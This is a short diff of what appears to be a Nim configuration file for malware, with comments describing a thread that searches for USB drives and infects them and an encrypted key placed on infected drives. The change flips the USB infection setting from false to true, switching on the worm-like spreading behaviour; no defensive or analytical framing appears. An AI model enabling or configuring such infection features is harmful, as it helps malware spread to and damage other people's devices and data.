@@ -58,7 +58,7 @@ const UNSAFE_REMOVE_FILE*: bool = false
 
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
-const USE_INFECT_THREAD*: bool = false
+const USE_INFECT_THREAD*: bool = true
 
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
